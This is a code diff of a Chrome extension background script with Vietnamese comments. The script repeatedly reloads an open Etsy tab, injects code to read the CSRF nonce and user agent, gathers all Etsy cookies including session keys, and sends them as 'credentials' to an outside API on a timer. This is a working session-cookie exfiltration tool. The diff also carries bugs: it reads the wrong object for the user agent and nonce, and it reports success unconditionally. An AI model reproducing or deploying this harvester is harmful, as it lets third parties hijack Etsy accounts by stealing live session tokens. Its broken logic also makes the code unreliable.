@@ -1,135 +1,163 @@
 let intervalId = null;
-const dev = 'https://api.cyberonegate.com';
-const pro = 'https://api.2hglobalstore.com';
+const dev = "https://api.cyberonegate.com";
+const pro = "https://api.2hglobalstore.com";
+let token = "";
+let storeId = "";
+let timer = 300;
+let server = "production";
+let sent = 0;
+let sentSuccess = 0;
+let sentFail = 0;
+const delayTime = 5000;
 
-// Hàm lấy cookie và gửi message
-function getCookiesAndSendMessage(storeId, token, csrfNonce, server) {
-    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
-        let urlApi = pro;
-        if(server === "development") {
-            urlApi = dev;
-        }
-        if (tabs.length === 0) return;
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.action === "startCookieExtractor") {
+        token = message.token;
+        storeId = message.storeId;
+        timer = Number(message.timer);
+        server = message.server;
+        sent = Number(message.sent);
+        sentSuccess = Number(message.sentSuccess);
+        sentFail = Number(message.sentFail);
 
-        let tab = tabs[0];
+        chrome.tabs.query({ }, (tabs) => {
+            (async () => {
+                const executeProcess = async () => {
+                    try {
+                        const etsyTab = tabs.find(tab => tab.url && tab.url.includes("https://www.etsy.com"));
 
-        const cookiesArr = []
-        let valid = false;
-
-
-
-        setTimeout(
-            () => {
-                chrome.cookies.getAll({domain: "www.etsy.com"}, (cookies) => {
-                    cookiesArr.push(...cookies);
-                });
-
-                chrome.cookies.getAll({domain: ".etsy.com"}, (cookies) => {
-                    cookiesArr.push(...cookies);
-                });
-
-                setTimeout(
-                    () => {
-                        const cookieNames = [];
-                        cookiesArr.forEach(cookie => {
-                            cookieNames.push(cookie.name);
-                        })
-                        if (
-                            cookieNames.includes("session-key-www") &&
-                            cookieNames.includes("et-v1-1-1-_etsy_com") &&
-                            cookieNames.includes("session-key-apex")
-                        ) {
-                            valid = true;
-                        }
-
-                        if (!valid) {
-                            console.log("Lỗi 401: Cookies không có: session-key-www, et-v1-1-1-_etsy_com, session-key-apex");
+                        if (!etsyTab) {
+                            console.error("Không tìm thấy tab Etsy nào.");
                             return;
                         }
 
-                        chrome.tabs.sendMessage(tab.id, {action: "getUserAgent"}, (response) => {
-                            let userAgent = response?.userAgent || "Không lấy được userAgent";
-
-                            // Gửi dữ liệu đến popup
-                            chrome.runtime.sendMessage({
-                                action: "updatePopupData",
-                                cookies: JSON.stringify(cookiesArr),
-                                userAgent: userAgent,
-                                csrfNonce: csrfNonce
-                            });
-
-
-                            const resultData = {
-                                keyword: "credentials",
-                                value: JSON.stringify({
-                                    cookies: JSON.stringify(cookiesArr),
-                                    userAgent: userAgent,
-                                    csrfNonce: csrfNonce
-                                })
-                            };
-
-                            // Gửi request đến API
-                            fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
-                                method: "PUT",
-                                body: JSON.stringify(resultData),
-                                headers: {
-                                    "Content-Type": "application/json",
-                                    Authorization: token,
-                                },
-                            })
-                                .then((response) => {
-
-                                    if (response.status === 401) {
-                                        console.log("Lỗi 401", error);
-                                    }
-                                })
-                                .catch((error) => {
-                                    console.log("Lỗi", error);
-                                    if (error.response?.status === 401) {
-                                        console.log("Lỗi 401", error);
-                                    }
-                                });
+                        await new Promise((resolve) => {
+                            chrome.tabs.reload(etsyTab.id, { bypassCache: true }, resolve);
                         });
-                    }, 2000
-                )
-            }, 3000
-        )
-    });
+
+                        await new Promise(resolve => setTimeout(resolve, delayTime));
+
+                        const domResult = await new Promise(resolve => {
+                            chrome.scripting.executeScript({
+                                target: { tabId: etsyTab.id },
+                                function: handleInteractDOM
+                            }, (result) => resolve(result));
+                        });
+
+                        // Phần xử lý cookies và gửi dữ liệu cũ
+                        const domData = domResult[0]?.result || {};
+
+                        const cookies = await Promise.all([
+                            getCookies("www.etsy.com"),
+                            getCookies(".etsy.com")
+                        ]).then(arr => arr.flat());
+
+                        if (!validateCookies(cookies)) {
+                            console.log("Missing required cookies");
+                            return;
+                        }
+
+                        const isDone = await sendApi(cookies, domResult.userAgent, domResult.csrfNonce);
+
+                        if(isDone) {
+                            await chrome.runtime.sendMessage({
+                                action: "sendData",
+                                data: {
+                                    ...domData,
+                                    cookies,
+                                    sent: sent++,
+                                    sentSuccess: sentSuccess++,
+                                    sentFail
+                                }
+                            });
+                        } else {
+                            await chrome.runtime.sendMessage({
+                                action: "sendData",
+                                data: {
+                                    ...domData,
+                                    cookies,
+                                    sent: sent++,
+                                    sentSuccess,
+                                    sentFail: sentFail++
+                                }
+                            });
+                        }
+                    } catch (error) {
+                        console.error("Lỗi trong quá trình xử lý:", error);
+                    }
+                }
+
+                await executeProcess();
+
+                intervalId = setInterval(
+                    executeProcess,
+                    timer * 60 * 1000
+                );
+            })()
+            .then(() => sendResponse({ success: true }))
+            .catch(error => sendResponse({ error: error.message }))
+            .finally(() => sendResponse({ finished: true })); // 👉 Keep chanel always close
+        });
+        return true; // 👉 Keep chanel always open
+    }
+
+    if (message.action === "finishCookieExtractor") {
+        if (intervalId) {
+            clearInterval(intervalId);
+            intervalId = null;
+            console.log("Stopped interval time");
+        }
+        return true;
+    }
+});
+
+const validateCookies = (cookies) => {
+    const required = ["session-key-www", "et-v1-1-1-_etsy_com", "session-key-apex"];
+    const cookieNames = cookies.map(c => c.name);
+    return required.every(name => cookieNames.includes(name));
+};
+
+// 👉 Get Element from DOM
+const handleInteractDOM = () => {
+    // 👉 Get user agent
+    const agent = navigator.userAgent;
+    // 👉 Get csrfNonce
+    const csrfMeta = document.querySelector('meta[name="csrf_nonce"]');
+    const csrf = csrfMeta ? csrfMeta.getAttribute("content") : "No Data";
+
+    return {
+        csrfNonce: csrf,
+        userAgent: agent,
+    }
 }
 
-
-// Lắng nghe message từ content.js
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    console.log(message);
-    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
-        if (tabs.length === 0) return;
-
-        if (message.action === "startCookieExtractor") {
-            console.log(message)
-            let server = message.server;
-            let token = message.token;
-            let storeId = message.storeId;
-            let timer = parseFloat(message.timer);
-            if (isNaN(timer) || timer <= 0) {
-                timer = 300;
-            }
-            let timerMinutes = timer * 60 * 1000;
-
-            // Run RightNow
-            getCookiesAndSendMessage(storeId, token, message.csrfNonce, server);
-
-            // Chạy theo timer
-            if (!intervalId) {
-                intervalId = setInterval(() => getCookiesAndSendMessage(storeId, token, message.csrfNonce, server), timerMinutes);
-            }
-
-            if (message.action === "finishCookieExtractor") {
-                if (intervalId) {
-                    clearInterval(intervalId);
-                    intervalId = null;
-                    console.log("Đã dừng gửi cookies!");
-                }
-            }
-        }
+const getCookies = (domain) => {
+    return new Promise(resolve => {
+        chrome.cookies.getAll({ domain }, resolve);
     });
-});
+};
+
+const sendApi = async (cookies, userAgent, csrfNonce) => {
+    let urlApi = server === "development" ? dev : pro;
+    const query = {
+        keyword: "credentials",
+        value: JSON.stringify({
+            cookies: JSON.stringify(cookies),
+            userAgent: userAgent,
+            csrfNonce: csrfNonce
+        })
+    }
+    try {
+        await fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
+            method: "PUT",
+            body: JSON.stringify(query),
+            headers: {
+                "Content-Type": "application/json",
+                Authorization: token
+            }
+        })
+        return true;
+    } catch (err) {
+        return false;
+    }
+}
